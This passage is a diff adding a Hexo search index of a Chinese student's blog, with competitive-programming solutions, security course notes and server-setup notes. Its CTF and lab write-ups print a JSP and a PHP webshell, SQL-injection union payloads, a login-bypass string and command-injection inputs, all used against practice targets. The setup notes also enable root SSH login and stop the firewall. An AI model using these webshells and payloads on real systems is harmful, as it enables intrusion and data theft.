@@ -1,0 +1,1059 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>欢迎回来，我的朋友</title>
+    <url>/2022/02/21/hello-world/</url>
+    <content><![CDATA[<p>这里是河南农业大学摆烂摸鱼划水指挥部指战中心</p>
+<h2 id="我们摆烂"><a href="#我们摆烂" class="headerlink" title="我们摆烂"></a>我们摆烂</h2><p>走路太累，人们摆烂不走，运河铁道，引擎轰鸣处，车到山前必有路</p>
+<p>计算太累，人类摆烂不算，电子计算机横空出世，二进制递归，光明未来我改写</p>
+<p>天空不可触及，人类摆烂不学飞，机翼略处，火箭穿云至上，一览九霄上</p>
+<p>太虚苍莽，唯有摆烂破沧桑，世事难为，且看开摆创辉煌！</p>
+<h2 id="我们划水"><a href="#我们划水" class="headerlink" title="我们划水"></a>我们划水</h2><p>哪有什么星辰大海？都是人类多年划水，以梦为浆，划开一片新天。</p>
+<h2 id="我们摸鱼"><a href="#我们摸鱼" class="headerlink" title="我们摸鱼"></a>我们摸鱼</h2><p>渔猎生活开启了人类的历史</p>
+<p>摸鱼是人类万事的开始</p>
+<p>学会摸鱼，才能摆脱悲惨的尘世</p>
+<p>超脱物外，成为真正的自己</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>新的开始</title>
+    <url>/2022/02/23/newstart/</url>
+    <content><![CDATA[<h1 id="可算是把我的博客建出来了"><a href="#可算是把我的博客建出来了" class="headerlink" title="可算是把我的博客建出来了"></a>可算是把我的博客建出来了</h1><p>从刚放寒假就决定要建立这个博客，但因为各种各样的理由，没有搞出来，怪我太慵懒，也怪事情太多了。</p>
+<p>现在好了，我有了这个博客可以用，总体来说还是很不错的。（笑）</p>
+<p>至于这个博客的作用嘛，我还是有一些打算的。</p>
+<p>说起最基本的功能呢，也就是记录一下平时干的事情，写写题解什么的，就当是日记好了。（笑）</p>
+<p>要说还有什么呢？那当然还是收录一些好玩的东西呢。</p>
+<p>我有个朋友打算把他写的科幻小说上传上来，当然也会有些好用的东西可以推荐呢。</p>
+<p>总之这就是建立这个博客最主要的目的了，别的什么倒还没有想过呢，不如一边饮酒一边细细想来吧。（笑）</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>划水</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tarjan算法的学习</title>
+    <url>/2022/11/02/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%20tarjan/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>换根dp</title>
+    <url>/2022/11/02/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%20%E6%8D%A2%E6%A0%B9dp/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>2020ccpc威海站补题记录</title>
+    <url>/2022/11/02/CCPC2020%E5%A8%81%E6%B5%B7%E7%AB%99%E8%A1%A5%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>威海站补题<br><a href="https://codeforces.com/gym/102798">https://codeforces.com/gym/102798</a></p>
+<h3 id="A-Golden-Spirit"><a href="#A-Golden-Spirit" class="headerlink" title="A. Golden Spirit"></a>A. Golden Spirit</h3><p>讲河两岸各有n个老人，他们需要过桥玩X分钟，休息完再回来，你需要帮他们过桥，你自己过桥或者扶老人过桥均需要t分钟，给定一组n，x，t（1e9范围），求所需最短时间。</p>
+<p>先把所有老人都扶到对岸显然是最优的，并且第一个到当前岸边的老人休息完后，即视为休息完毕<br>然后分为两种情况考虑：</p>
+<blockquote>
+<p>1，把所有老人扶到对岸，然后等当前岸边第一个过来的老人（全部老人中第二个过桥的）休息完再走，此时的贡献是</p>
+</blockquote>
+<pre><code>2*2*n*t+x-(2*(n-1))*t
+</code></pre>
+<blockquote>
+<p>2,把所有老人扶到对岸，然后到对岸，等对岸第一个过来的老人（全部老人中第一个过桥的）休息完再走，此时的贡献是</p>
+</blockquote>
+<pre><code>2*2*n*t-(2*(n-1))*t+t
+</code></pre>
+<p>两个情况取max即可<br>代码实现：</p>
+<pre><code>#include&lt;bits/stdc++.h&gt;
+using namespace std;
+typedef long long ll;
+
+int main()&#123;
+    int t;
+    cin&gt;&gt;t;
+    while(t--)&#123;
+        ll n,x,k;
+        scanf(&quot;%lld%lld%lld&quot;,&amp;n,&amp;x,&amp;k);        
+        ll ans1=(n*4*k)+max(0ll,x-(2ll*n*k-2*k));
+        ll ans2=(n*4*k)+k+max(0ll,x-(2ll*n*k));
+        cout&lt;&lt;min(ans1,ans2)&lt;&lt;&quot;\n&quot;;
+    &#125;
+    return 0;
+&#125;
+</code></pre>
+<h1 id="C-Rencontre"><a href="#C-Rencontre" class="headerlink" title="C. Rencontre"></a>C. Rencontre</h1><p>讲一棵树，n个节点，读入u，v，w，表示u和v之间有双向边，距离为w，在树上有三次选项，第i次选择会等概率的从Mi个给定的点中选，然后找一个点，到三次选择的点距离和最小，求这个距离和的期望值  </p>
+<p>我们考虑算出三个点的简单路径，相加再除以二就是到三个的最小距离和的点的距离和，然后再算期望<br>直接算肯定不行，但是注意到本题是很多种可能求期望<br>我们可以利用换根dp求出每个点到其他所有点的距离和，这样可以求出在枚举任意三个点为根时的所有简单路径和，除以二便是所有到三次选择的点距离和最小的点的距离的总和<br>然后考虑哪些点可以给出贡献，我们只需要在树形dp计算路径时候，只记录被某次选择包含的点到根节点的路径（三次选择分别计算），然后换根求出所有点作为根时，三次选择的所有点分别到该根节点的的距离和。然后枚举三次选择，将维护好的另外两种选择的值直接累加过来，再除以对应选择的节点数算出期望即可  </p>
+<p>代码实现：</p>
+<pre><code>#include&lt;bits/stdc++.h&gt;
+using namespace std;
+const int N=2e5+1000,M=4e5+100;
+typedef double db;
+typedef long long ll;
+int n,h[N],ne[M],t[M],val[M],idx=2;
+int m[3],nu[N][3],uu[N][3];
+ll d[N][3];
+db anss;
+
+void add(int u,int v,int w)&#123;
+    ne[idx]=h[u];
+    t[idx]=v;
+    val[idx]=w;
+    h[u]=idx++;
+&#125;
+
+void dfs(int x,int pa)&#123;
+    for(int i=h[x];i;i=ne[i])&#123;
+        if(i==(pa^1))continue;
+        int y=t[i]; 
+        dfs(y,i);
+        for(int j=0;j&lt;3;j++)&#123;
+            nu[x][j]+=nu[y][j]+uu[y][j];
+            d[x][j]+=(ll)(nu[y][j]+uu[y][j])*val[i]+d[y][j];
+            
+        &#125;
+    &#125;
+    return ;
+&#125;
+void dp(int x,int fr,int e)&#123;
+    if(fr!=0)&#123;
+        for(int i=0;i&lt;3;i++)&#123;
+            d[x][i]=d[fr][i]+(1ll*m[i]-2ll*uu[x][i]-2ll*nu[x][i])*val[e];
+        &#125;
+
+    &#125;
+    for(int i=h[x];i;i=ne[i])&#123;
+        int y=t[i];
+        if(y==fr)continue;
+        dp(y,x,i);
+    &#125;
+    return ;
+&#125;
+int main()&#123;
+    #ifdef LOCAL
+    freopen(&quot;input.in&quot;,&quot;r&quot;,stdin);
+    freopen(&quot;output.out&quot;,&quot;w&quot;,stdout);
+    #endif
+    scanf(&quot;%d&quot;,&amp;n);
+    int u,v,w;
+    for(int i=1;i&lt;n;i++)&#123;
+        scanf(&quot;%d%d%d&quot;,&amp;u,&amp;v,&amp;w);
+        add(u,v,w);
+        add(v,u,w);
+    &#125;
+    
+    int a;
+    for(int i=0;i&lt;3;i++)&#123;
+        scanf(&quot;%d&quot;,&amp;m[i]);
+        for(int j=1;j&lt;=m[i];j++)&#123;
+            scanf(&quot;%d&quot;,&amp;a);
+            uu[a][i]=1;
+        &#125;
+    &#125;
+    dfs(1,0);
+    dp(1,0,0);
+    for(int k=0;k&lt;3;k++)&#123;
+        for(int j=k+1;j&lt;3;j++)&#123;
+            for(int i=1;i&lt;=n;i++)&#123;
+                if(uu[i][k])anss+=(db)d[i][j]/(1.0*m[j]*m[k]);
+            &#125;
+        &#125;
+    &#125;
+    printf(&quot;%.10lf&quot;,anss/2);
+    return 0;
+&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>算法竞速赛</category>
+      </categories>
+      <tags>
+        <tag>补题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CCPC区域赛集锦</title>
+    <url>/2022/10/30/CCPC%E5%8C%BA%E5%9F%9F%E8%B5%9B%E9%9B%86%E9%94%A6/</url>
+    <content><![CDATA[<h1 id="2020绵阳"><a href="#2020绵阳" class="headerlink" title="2020绵阳"></a><a href="https://codeforces.com/gym/102822">2020绵阳</a></h1><h1 id="2020威海"><a href="#2020威海" class="headerlink" title="2020威海"></a><a href="https://codeforces.com/gym/102798">2020威海</a></h1>]]></content>
+      <categories>
+        <category>集锦</category>
+      </categories>
+      <tags>
+        <tag>CCPC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>散题10/28</title>
+    <url>/2022/10/28/%E6%95%A3%E9%A2%9810-28/</url>
+    <content><![CDATA[<h1 id="P2856-USACO06FEB-Cellphones-G"><a href="#P2856-USACO06FEB-Cellphones-G" class="headerlink" title="P2856 [USACO06FEB]Cellphones G"></a>P2856 [USACO06FEB]Cellphones G</h1><p><a href="https://www.luogu.com.cn/problem/P2856">USACO06FEB]Cellphones G - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p>
+<p><strong>【题目翻译】：</strong> 奶牛的名字都是由英文字母表的前L(1 \leq L \leq 26)<em>L</em>(1≤<em>L</em>≤26)个字母构成的（全部为<strong>大写字母</strong>且长度\leq 10≤10）。现在奶牛们想设计一种手机， 有B<em>B</em>个按键。请你把这<em>L</em>个字母<strong>按顺序</strong>分配给<em>B</em>个按键，使能够通过按这些键而唯一确定的奶牛数尽量多。求最多可以唯一确定多少头奶牛，输出方案。如果有多种方案，输出编号小的按键容纳字母最多的方案。</p>
+<p>没想到是个暴力求解</p>
+<p>暴力枚举每个按键包含的字母，时间复杂度O（能过），由于每个字符串长度最多只有10，我们用哈希进行储存，每次处理n个串的哈希值，然后排序，只出现一次的哈希值的串贡献为1，对所有枚举情况的值取最大值即可。</p>
+<pre><code>#include&lt;bits/stdc++.h&gt;
+using namespace std;
+const int N=1010;
+int b,l,n;
+int num[N],tmd[30],hs[30],ans;
+char s[N][15],an[30];
+long long has[N];
+
+void anss()&#123;
+    for(int i=1;i&lt;=n;i++)&#123;
+        has[i]=0;
+        for(int j=1;j&lt;=num[i];j++)&#123;
+            has[i]=has[i]*(b+1)+tmd[(int)s[i][j]-(int)&#39;A&#39;+1];
+        &#125;
+    &#125;
+    sort(has+1,has+1+n);
+    int tmp=0;
+    for(int i=1;i&lt;=n;i++)&#123;
+        if(has[i]!=has[i-1]&amp;&amp;has[i]!=has[i+1])tmp++;
+    &#125;
+    if(tmp&gt;=ans)&#123;
+        ans=tmp;
+        for(int i=1;i&lt;=l;i++)&#123;
+            an[i]=tmd[i];
+        &#125;
+    &#125;
+&#125;
+
+void dfs(int i,int j)&#123;
+    if(j&gt;l)&#123;
+        if(i&gt;b)anss();
+        return ;
+    &#125;
+    if(i&gt;b)return;
+    if(i&lt;=b)&#123;
+        tmd[j+1]=i+1;
+        dfs(i+1,j+1);
+    &#125;
+    if(l-j+i&gt;=b)&#123;
+        tmd[j+1]=i;
+        dfs(i,j+1);
+    &#125;
+&#125;
+
+int main()&#123;
+    scanf(&quot;%d%d%d&quot;,&amp;b,&amp;l,&amp;n);
+    for(int i=1;i&lt;=n;i++)&#123;
+        scanf(&quot;%s&quot;,s[i]+1);
+        num[i]=strlen(s[i]+1);
+    &#125;
+    tmd[1]=1;
+    dfs(1,1);
+    cout&lt;&lt;ans&lt;&lt;&quot;\n&quot;;
+    for(int i=1;i&lt;=l;i++)&#123;
+        printf(&quot;%c&quot;,i+&#39;A&#39;-1);
+        if(an[i+1]!=an[i])cout&lt;&lt;&quot;\n&quot;;
+    &#125;
+
+    return 0;
+&#125;
+        
+</code></pre>
+<h1 id="P3668-USACO17OPEN-Modern-Art-2-G"><a href="#P3668-USACO17OPEN-Modern-Art-2-G" class="headerlink" title="P3668 [USACO17OPEN]Modern Art 2 G"></a>P3668 [USACO17OPEN]Modern Art 2 G</h1><p><a href="https://www.luogu.com.cn/problem/P3668">题目链接</a><br>小TY的同学HF也想创作艺术</p>
+<p>HF只有一块长条状的画布(画条)，所以每一次涂色只能涂上连续几个单位的颜料，同样新的颜料可以完全覆盖旧的颜料</p>
+<p>由于他的颜料同样非常傲娇，每次涂完要等上1day才能完全干，只有旧颜料干了以后才能用新颜料覆盖</p>
+<p>现在小HF用了2017个年头终于画出了一个大作品，自己非常满意</p>
+<p>现在他想复制这份作品</p>
+<p>每种颜色刷上去时候一定都是连续的，如果后刷的颜色被先刷上去的区间包含，证明后刷上去的颜色先结束。<br>先预处理出所有颜色最早出现的位置和最晚出现的位置，然后我们考虑用一个栈来维护当前状态  </p>
+<p>如果当前颜色与栈顶颜色不同，且未曾入栈，则该颜色的天数等栈顶颜色天数加一，该颜色入栈，并标记为已经入栈<br>如果该颜色第二次出现，并且已经是最后一次出现，那该颜色出栈<br>如果当前颜色与栈顶颜色不同，且已经入过栈，则当前状态不合法输出负一，程序结束<br>如果循环结束，且不存在不合法情况，那过程中记录的颜色的天数即为最终答案  </p>
+<pre><code>#include&lt;bits/stdc++.h&gt;
+using namespace std;
+const int N=1e5+100;
+int n,a[N],num[N],st[N],t;
+int fr[N],ed[N];
+bool b[N];
+int main()&#123;
+    cin&gt;&gt;n;
+    int z=0;
+    memset(fr,0x3f,sizeof(fr));
+    for(int i=1;i&lt;=n;i++)&#123;
+        cin&gt;&gt;a[i];
+        fr[a[i]]=min(i,fr[a[i]]);
+        ed[a[i]]=max(i,ed[a[i]]);
+        if(a[i]==0)z++;
+    &#125;
+    if(z==n)&#123;
+        printf(&quot;0&quot;);
+        return 0;
+    &#125;
+    int anss=0;
+    for(int i=1;i&lt;=n;i++)&#123;
+        if(!t||st[t]!=a[i])&#123;
+            if(!b[a[i]])&#123;
+                b[a[i]]=1;
+                if(i==ed[a[i]])&#123;
+                    anss=max(anss,num[t]+1);
+                    continue;
+                &#125;
+                st[++t]=a[i];
+                if(a[i]!=0)num[t]=num[t-1]+1;
+                else num[t]=num[t-1];
+                anss=max(anss,num[t]);
+                continue;
+            &#125;
+            else &#123;
+                printf(&quot;-1&quot;);
+                return 0;
+            &#125;
+        &#125;
+        if(st[t]==a[i])&#123;
+            if(i==ed[a[i]])t--;
+            continue;
+        &#125;
+    &#125;
+    printf(&quot;%d&quot;,anss);
+    return 0;
+&#125; 
+</code></pre>
+]]></content>
+      <categories>
+        <category>信息学</category>
+      </categories>
+      <tags>
+        <tag>散题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复习·二分</title>
+    <url>/2022/10/28/%E5%A4%8D%E4%B9%A0%C2%B7%E4%BA%8C%E5%88%86/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>upload-lab混关记录</title>
+    <url>/2022/08/01/upload-lab%E6%B7%B7%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="upload-lab"><a href="#upload-lab" class="headerlink" title="upload-lab"></a>upload-lab</h1><p>upload-labs是收集ctf和渗透测试中文件上传遇到的各种漏洞的靶场，旨在通过关卡的形式来帮助大家对文件上传有个全面的了解。</p>
+<p>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
+<h2 id="pass-1"><a href="#pass-1" class="headerlink" title="pass-1"></a>pass-1</h2><p>第一题是前端限制，要求上传的文件类型为三种图片格式</p>
+<p>由于是前端限制，直接f12删除代码端即可</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/08/01/8ccc62fbe7279a04.png"></p>
+<h2 id="pass-2"><a href="#pass-2" class="headerlink" title="pass-2"></a>pass-2</h2><p>Content-Type绕过</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/08/01/c16a3417463775cf.png"></p>
+<p>可以看出，他限制了上传文件的类型，但是没有限制后缀名</p>
+<p>把php一句话木马后缀改成.jpg，然后用bp抓上传的包</p>
+<p>把里面的filename中的.jpg改回.php即可</p>
+<p>或者直接上传.php，bp抓包，把文件类型改为image&#x2F;jpeg</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/08/01/4b3ad466e5033e90.png"></p>
+<h2 id="pass-3"><a href="#pass-3" class="headerlink" title="pass-3"></a>pass-3</h2><p>特殊名字绕过</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/08/01/9f9500cc3b490631.png"></p>
+<p>可以看到，他加了黑名单，过滤大写，过滤末尾的点，过滤::$DATA以及去掉了末尾的空格</p>
+<p>但是黑名单不太严谨，我们可以用php1php2 php3 php4 php5 来进行黑名单绕过</p>
+<p>上传这种后缀的马就行</p>
+<h2 id="pass-4"><a href="#pass-4" class="headerlink" title="pass-4"></a>pass-4</h2><p>.htaccess文件绕过</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/08/01/cab1e9b6278c928d.png"></p>
+<p>这一题比较高明一点，限制的比较死，但是也有办法</p>
+]]></content>
+      <categories>
+        <category>靶场；</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>难度2</title>
+    <url>/2022/07/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%9A%BE%E5%BA%A62/</url>
+    <content><![CDATA[<p>web嘛，不就是研究怎么偷自行车吗（逃  </p>
+<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h1><p>看题目，是一个文件上传题目，还是最简单那种（逃<br>那就摸出我们的一句话木马来<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/52aee8f1105f2858.png"><br>f12看到文件后缀限制<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/e5c13d8109436b45.png"><br>也就是说需要绕过，post请求还是可以轻松绕过的<br>先把php马改成jpg后缀，bp抓包，然后直接上传<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/473e049611680f6a.png"><br><img src="https://s3.bmp.ovh/imgs/2022/07/14/c01503a67a8105a2.png"><br>把这个改成php，然后发送请求<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/81bc73bf7601079b.png"><br>可以看到，上传成功了<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/2bb74a4ef9f79257.png"><br>访问一下这个路径，可以访问<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/8aec18e389cff6bb.png"><br>摸出咱的蚁剑进行登录<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/9220270af546d6b2.png"><br>然后就可以进入靶机的后台，拿到flag  </p>
+<pre><code>cyberpeace&#123;9df2577798cc26b31c2c208f0730b82d&#125;
+</code></pre>
+<h1 id="xff与referer"><a href="#xff与referer" class="headerlink" title="xff与referer"></a>xff与referer</h1><p>伪造xff和伪造referer<br>添加xff和referer的头文件即可<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/630eb9bbb609e8dd.png"><br><a href="https://www.cnblogs.com/huhu1020387597/p/11479468.html">关于referer</a><br><a href="https://baike.baidu.com/item/X-Forwarded-For/3593639?fr=aladdin">关于xff</a>  </p>
+<h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><p>我一进来就看见一个ping查询界面（逃<br>题目都说了，没写waf，说了就是妹写<br>那就把执行代码拼接在ping的ip后面，<br>利用后台的运行代码给咱们找找自行车在哪儿<br>输入127.0.0.1;find &#x2F; -name “flag*”<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/7248b042b27d9962.png"></p>
+<p>然后看到一个flag.txt<br>这就是咱要的了，同样的方法，这次把自行车给他骑走<br>127.0.0.1;cat &#x2F;home&#x2F;flag.txt  </p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/07/14/c7e715ea389ce749.png"></p>
+<pre><code>cyberpeace&#123;2750c16d03c412e3381a356d4a5d9ecc&#125;
+</code></pre>
+<p>难一点的话，会把空格过滤掉，遇见再说  </p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>他的代码都在上面写了，按顺序反向解密一下就可<br>rot13（和凯撒密码key&#x3D;13一样）解密<a href="https://www.xiao84.com/tools/103175.html">凯撒解密</a><br><a href="http://tool.huixiang360.com/str/reverse.php">反转</a><br><a href="https://base64.supfree.net/">base64解密</a><br>然后手动写个代码，给每一位ascll减一<br><img src="https://s3.bmp.ovh/imgs/2022/07/14/6c48158efaf570cc.png"><br>拿到的结果再反转即可</p>
+<pre><code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>打题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信安世纪7.5的结课赛</title>
+    <url>/2022/07/06/%E4%BF%A1%E5%AE%89%E4%B8%96%E7%BA%AA7-5%E7%9A%84%E7%BB%93%E8%AF%BE%E8%B5%9B/</url>
+    <content><![CDATA[<p>#sign<br>签到题 f12 base64 抬走<br>#key<br>一个万能密码的题，用户名随便输，密码是</p>
+<pre><code>111&#39;or&#39;1&#39;=&#39;1
+</code></pre>
+<p>前面三个1也可以换成其他的<br>#java<br>上传文件漏洞，并且是java脚本类型的</p>
+<pre><code>&lt;%!
+class U extends ClassLoader &#123;
+    U(ClassLoader c) &#123;
+        super(c);
+    &#125;
+    public Class g(byte[] b) &#123;
+        return super.defineClass(b, 0, b.length);
+    &#125;
+&#125;
+
+public byte[] base64Decode(String str) throws Exception &#123;
+    try &#123;
+        Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
+        return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
+    &#125; catch (Exception e) &#123;
+        Class clazz = Class.forName(&quot;java.util.Base64&quot;);
+        Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
+        return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
+    &#125;
+&#125;
+%&gt;
+&lt;%
+String cls = request.getParameter(&quot;passwd&quot;);
+if (cls != null) &#123;
+    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+&#125;
+%&gt;
+</code></pre>
+<p>把这样一个.jsp的木马上传上去，打开&#x2F;upload&#x2F;1.jsp&#x2F;的目录，如果能显示空白页，大概率能成<br>用蚁剑或者菜刀之类的webshall连进去，密码是passwd，进去能在根目录找到flag  </p>
+<h1 id="browser"><a href="#browser" class="headerlink" title="browser"></a>browser</h1><p>也是木马题，不过和上面那个不太一样，需要绕过<br>我们用php一句话木马</p>
+<pre><code>&lt;?php @eval($_POST[value]);?&gt;
+</code></pre>
+<p>上传时候，先改成1.jpg，然后用brupsuit抓包，把上传文件包的文件后缀改回.php<br>同样，目录访问一下，空白页，回来用webshell连，密码是value，根目录有flag  </p>
+<h1 id="mapmap"><a href="#mapmap" class="headerlink" title="mapmap"></a>mapmap</h1><p>一道注入题，而且有报错有回显<br>id&#x3D;1’得到报错，所以代码里是’<br>然后</p>
+<pre><code>payload: id=-1&#39; union select 1,2,3,4,5,6 -- +
+</code></pre>
+<p>得到回显数为六，并且显示了2和3<br>然后暴库</p>
+<pre><code>payload: id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from security.users,4,5,6 -- +
+</code></pre>
+<p>之后再爆表爆字段，拿到字段值key1</p>
+<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>一个rce注入<br>输入</p>
+<pre><code>127.0.0.1;cat$&#123;IFS&#125;../../flag
+</code></pre>
+<p>即可拿到flag</p>
+<p>#我是傻逼<br>因为中间摸了六个小时鱼，就写了这么多（逃</p>
+]]></content>
+      <categories>
+        <category>ctf-wp</category>
+      </categories>
+      <tags>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅学计算机网络（1.概述）</title>
+    <url>/2022/06/29/%E6%B5%85%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%881-%E6%A6%82%E8%BF%B0%EF%BC%89/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>信安世纪（信息获取）</title>
+    <url>/2022/06/28/%E4%BF%A1%E5%AE%89%E4%B8%96%E7%BA%AA%EF%BC%88%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%EF%BC%89/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>信安世纪（行业认知及产品技术）</title>
+    <url>/2022/06/28/%E4%BF%A1%E5%AE%89%E4%B8%96%E7%BA%AA%EF%BC%88%E8%A1%8C%E4%B8%9A%E8%AE%A4%E7%9F%A5%E5%8F%8A%E4%BA%A7%E5%93%81%E6%8A%80%E6%9C%AF%EF%BC%89/</url>
+    <content><![CDATA[<p>没有绝对安全的系统<br>网络诞生的初衷是为了通信和共享，并未考虑安全因素<br>网络协议是人指定的，必然存在缺陷<br>软硬件系统是人开发的，必然存在漏洞<br>漏洞肯定存在，人最大的漏洞<br>CMMI 每千行代码的漏洞数量  </p>
+<h1 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h1><h1 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h1><p>拒绝服务攻击（ddos）<br>常用来使服务器和网络瘫痪的网络攻击手段<br>流量型<br>漏洞型<br>混合型<br>无法解决只能缓解<br>1.CDN（内容分化网络，解决用户到机房的最后一段距离的，使得相应即使的）<br>可以使得僵尸网络流量分流到各种CDN节点中<br>2.前端部署抗D安全防护设备   </p>
+<p>然后 讲了一堆法律相关我现在用不上的，摆烂！</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>团队主页的部署2</title>
+    <url>/2022/06/25/%E5%9B%A2%E9%98%9F%E4%B8%BB%E9%A1%B5%E7%9A%84%E9%83%A8%E7%BD%B22/</url>
+    <content><![CDATA[<h1 id="上次耻辱过后，一不做二不休，直接重装系统"><a href="#上次耻辱过后，一不做二不休，直接重装系统" class="headerlink" title="上次耻辱过后，一不做二不休，直接重装系统"></a>上次耻辱过后，一不做二不休，直接重装系统</h1><p>学长的oj就无了（）<br>不过以后再说这个<br>这波需要重新配置一下服务器了  </p>
+<h2 id="第一步的话是基础配置"><a href="#第一步的话是基础配置" class="headerlink" title="第一步的话是基础配置"></a>第一步的话是基础配置</h2><h3 id="配个ip"><a href="#配个ip" class="headerlink" title="配个ip"></a>配个ip</h3><p>然后发现腾讯云的服务器已经配好ip了（不过考虑人家是物理机，应该没啥问题）  </p>
+<h3 id="配个yum"><a href="#配个yum" class="headerlink" title="配个yum"></a>配个yum</h3><p>然后发现他默认用的是腾讯云家的yum<br>不用自己配，真好（逃    </p>
+<h3 id="开个ssh服务"><a href="#开个ssh服务" class="headerlink" title="开个ssh服务"></a>开个ssh服务</h3><p>yum list installed | grep openssh-server<br>看一看有没有安装ssh<br>然后发现是有的，那么打开他<br>cd &#x2F;etc&#x2F;ssh<br>vim sshd.conf<br>把 Port 和ListenAddress 的注释删掉<br>permitrootlogin yes 注释删掉<br>passwordAuthentication yes 注释删掉<br>然后是sudo service sshd start<br>完事  </p>
+<h3 id="关个防火墙"><a href="#关个防火墙" class="headerlink" title="关个防火墙"></a>关个防火墙</h3><p>systemctl stop firewalld.service  </p>
+<p>Xshall能连上，还不错  </p>
+<h2 id="第二部是装docker"><a href="#第二部是装docker" class="headerlink" title="第二部是装docker"></a>第二部是装docker</h2><p>先塞一个yum 源<br>yum-config-manager –add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a><br>然后安装<br>yum install docker-ce<br>启动<br>sudo systemctl start docker<br>开启自启动<br>sudo systemctl enable docker<br>输入docker version  之后显示了版本信息，安装成功  </p>
+<h2 id="第三步，上传我的东西"><a href="#第三步，上传我的东西" class="headerlink" title="第三步，上传我的东西"></a>第三步，上传我的东西</h2><p>因为之前吧xshall下载回来了，我们直接用方便的rz  </p>
+<p>先试试nginx能不能用，上次耻辱下线就是因为nginx死活不行<br>先拉取nginx<br>docker pull nginx<br>docker run -dit –name&#x3D;nginx -p 80:80 nginx<br>这里我找到一个点，就是之前看的博客里面是没有-t这个参数的<br>但是我的理解中，服务端至少要有一个终端，没有-t就不能交互<br>于是加上-t<br>然后外网访问服务器80端口，能看到nginx的主页<br>我觉得成了<br>可是，我在<br>docker run -dit –name&#x3D;nginx -p 90:80 nginx<br>的时候又出现了问题，无法访问<br>和上次gg时候一样，我吐了啊。。。。<br>在我懵逼至极的时候，我想起来老大之前服务器里面使用的那几个端口<br>我一试，这几个端口都显示了nginx主页<br>我直接人傻了，于是去问郁老大  </p>
+<h1 id="以下内容建议全文背诵"><a href="#以下内容建议全文背诵" class="headerlink" title="以下内容建议全文背诵"></a>以下内容建议全文背诵</h1><p>老大说： </p>
+<pre><code>你是不是腾讯云里面没有设置安全组里的开放端口啊
+</code></pre>
+<p>我：？？？？？？？？？<br>打开，好了（）<br>全体目光向我看齐<br>就这儿，对<br>我宣布个事儿<br>我是个（  ——  ——  ）<br>然后docker run -dit –name&#x3D;nginx -p 14514:80 -v &#x2F;usr&#x2F;html:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html nginx<br>可以访问（）<br>我。。。。。。。。。。。。  </p>
+<h1 id="得到的教训是"><a href="#得到的教训是" class="headerlink" title="得到的教训是"></a>得到的教训是</h1><p>欲善其功，先利其器<br>先给自己用的东西整明白再说（）  </p>
+]]></content>
+      <categories>
+        <category>团队工作</category>
+      </categories>
+      <tags>
+        <tag>工作</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>团队主页的部署</title>
